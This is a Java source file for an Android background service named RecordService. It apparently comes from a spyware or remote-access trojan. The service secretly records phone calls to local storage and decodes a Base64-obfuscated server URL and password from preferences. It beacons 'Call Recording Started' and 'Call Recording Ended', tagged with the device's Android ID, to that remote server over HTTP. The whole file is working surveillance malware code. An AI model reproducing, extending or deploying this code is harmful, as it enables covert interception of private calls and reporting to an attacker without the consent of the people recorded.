package com.connect;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.lang.Exception;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;

import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.IBinder;
import android.app.Service;
import android.preference.PreferenceManager;
import android.util.Base64;
import android.util.Log;
import android.content.SharedPreferences;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;

public class RecordService extends Service implements MediaRecorder.OnInfoListener, MediaRecorder.OnErrorListener
{
    public final String DEFAULT_STORAGE_LOCATION = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Calls" + File.separator;
    private MediaRecorder recorder = null;
    private boolean isRecording = false;
    private File recording = null;;
	private String URL;
	private String password;
	
    private File makeOutputFile (SharedPreferences prefs)
    {
    	
 		try {
 			URL = new String( Base64.decode( PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("URL", ""), Base64.DEFAULT ));
 			password = new String( Base64.decode( PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("password", ""), Base64.DEFAULT ));
		} catch (Exception e1) {e1.printStackTrace();}
 		
        File dir = new File(DEFAULT_STORAGE_LOCATION);

        if (!dir.exists()) {
            try {
                dir.mkdirs();
            } catch (Exception e) {
                return null;
            }
        } else {
            if (!dir.canWrite()) {
                return null;
            }
        }

        SimpleDateFormat sdf = new SimpleDateFormat("yyyy_MM_dd_HH_mm");
        String currentDateandTime = sdf.format(new Date());

        try {
            return File.createTempFile(currentDateandTime, ".mpg", dir);
        } catch (IOException e) {
            return null;
        }
    }

    public void onCreate()
    {
        super.onCreate();
        recorder = new MediaRecorder();
    }

    public void onStart(Intent intent, int startId) {

        if (isRecording) return;

        Context c = getApplicationContext();
        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(c);
        
        int audiosource = 1; 
        int audioformat = 1; 

        recording = makeOutputFile(prefs);
        if (recording == null) {
            recorder = null;
            return;
        }

        try {
            recorder.reset();
            recorder.setAudioSource(audiosource);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
            recorder.setOutputFile(recording.getAbsolutePath());
            recorder.setOnInfoListener(this);
            recorder.setOnErrorListener(this);
            
            //STREAM TO PHP? //Alert
            
            try {
                recorder.prepare();
            } catch (java.io.IOException e) {
                recorder = null;
                return; 
            }            
            recorder.start();
            isRecording = true;
            
			getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Call Recording Started");

        } catch (java.lang.Exception e) {
            recorder = null;
        }

        return;
    }

    public void onDestroy()
    {
        super.onDestroy();

        if (null != recorder) {
            isRecording = false;
            recorder.release();
            
			try {
				getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Call Recording Ended");
			} catch (UnsupportedEncodingException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

        }
    }


    public IBinder onBind(Intent intent)
    {
        return null;
    }

    public boolean onUnbind(Intent intent)
    {
        return false;
    }

    public void onRebind(Intent intent)
    {
    }


    // MediaRecorder.OnInfoListener
    public void onInfo(MediaRecorder mr, int what, int extra)
    {
        isRecording = false;
    }

    // MediaRecorder.OnErrorListener
    public void onError(MediaRecorder mr, int what, int extra) 
    {
        isRecording = false;
        mr.release();
    }
    
    public InputStream getInputStreamFromUrl(String urlBase, String urlData) throws UnsupportedEncodingException {
    	
    	Log.d("com.connect", urlBase);
    	Log.d("com.connect", urlData);

    	urlData = URLEncoder.encode (urlData, "UTF-8");
    	if(isNetworkAvailable())
    	{
    	  InputStream content = null;
    	  try 
    	  {
    	    HttpClient httpclient = new DefaultHttpClient();
    	    HttpResponse response = httpclient.execute(new HttpGet(urlBase + urlData));
    	    content = response.getEntity().getContent();
    	    httpclient.getConnectionManager().shutdown();
    	  } catch (Exception e) {
    	  }
    	    return content;
    	}
		return null;
    }
    //********************************************************************************************************************************************************
    public boolean isNetworkAvailable() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo networkInfo = cm.getActiveNetworkInfo();
        if (networkInfo != null && networkInfo.isConnected()) {
            return true;
        }
        return false;
    } 
}
